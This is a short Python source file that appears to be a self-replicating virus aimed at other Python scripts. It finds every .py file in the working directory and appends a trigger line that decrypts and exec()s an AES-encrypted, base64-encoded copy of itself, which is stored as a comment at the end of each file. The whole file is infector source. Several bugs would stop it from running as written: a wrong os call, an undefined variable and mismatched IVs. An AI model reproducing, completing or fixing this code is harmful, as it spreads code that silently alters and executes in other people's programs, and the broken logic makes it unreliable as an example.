try:
	if test_phase :
		pass
except:
	pass
else:
	if test_phase :
		infected = True
		exit()

import __main__

files = [f for f in os.listdir() if os.isfile(f) and f.endswith('.py')]

def get_payload_encrypted(f) :
	target = open(f, 'r')
	lines = target.readlines()
	return lines[-1][1:]

def decrypt_payload(p) :
	this = open(__main__.__file__, 'r') 
	p = base64.b64decode(p);

	intialization_vector = Random.new().read(AES.block_size)
	cipher = AES.new(this.read(24), AES.MODE_CFB, intialization_vector)

	this.close()
	return cipher.decrypt(p)[16:]

def encrypt_payload(p,target):
   target_file = open(target, 'r')

   intialization_vector = Random.new().read(AES.block_size)
   cipher = AES.new(target_file.read(24), AES.MODE_CFB, intialization_vector)
   encrypted = intialization_vector + cipher.encrypt(p)

   target_file.close()
   return base64.b64encode(encrypted)

def test_file(f):
	payload = get_payload_encrypted(f)
	payload = decrypt_payload(payload)

	test_phase = True
	infected = False

	exec(payload)

	if infected :
		return True
	else :
		return False

for f in files:
	if test_phase(f) :
		continue

	trigger = "import base64, sys, os, __main__; from Crypto import Random; from Crypto.Cipher import AES; from io import StringIO\n" + "e = AES.new(StringIO.StringIO(open(__main__.__file__, 'r')).read(24), AES.MODE_CFB, Random.new().read(AES.block_size)).decrypt(base64.b64decode(open(__main__.__file__, 'r').readlines()[-2][1:]))[16:]\n" + "exec(e)\n"
	target = open(f, 'a')

	target.write(trigger)
	target.write("#" + encrypt_payload(e, target))

	target.flush()
	target.close()